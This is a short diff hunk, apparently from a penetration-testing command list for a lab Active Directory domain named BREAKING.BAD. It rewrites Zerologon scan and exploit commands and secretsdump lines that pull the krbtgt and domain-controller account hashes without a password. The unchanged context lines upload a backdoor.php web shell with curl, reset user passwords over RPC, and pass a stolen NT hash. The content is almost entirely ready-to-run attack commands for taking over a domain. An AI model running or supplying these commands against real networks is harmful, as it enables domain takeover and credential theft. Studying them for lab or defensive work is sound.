@@ -165,6 +165,7 @@ curl http://192.168.10.10/ --upload-file backdoor.php -v
 net rpc password someuser -U BREAKING/anotheruser%'P@ssword' -S DC01.BREAKING.BAD
 net rpc password someuser -U BREAKING/anotheruser -S DC01.BREAKING.BAD
 pth-net rpc password someuser -U BREAKING/anotheruser%ffffffffffffffffffffffffffffffff:c1c635aa12ae60b7fe39e28456a7bac6 -S DC01.BREAKING.BAD
-secretsdump -just-dc-user krbtgt -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'BREAKING.BAD/DC01$@dc01.breaking.bad'
-secretsdump -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'BREAKING.BAD/DC01$@dc01.breaking.bad'
-zerologon DC01 192.168.56.101
+zerologon-scan DC01 192.168.56.101
+zerologon-exploit DC01 192.168.56.101
+secretsdump -just-dc-user krbtgt -no-pass 'BREAKING.BAD/DC01$@dc01.breaking.bad'
+secretsdump -history -just-dc-user 'DC01$' -no-pass 'BREAKING.BAD/DC01$@dc01.breaking.bad'
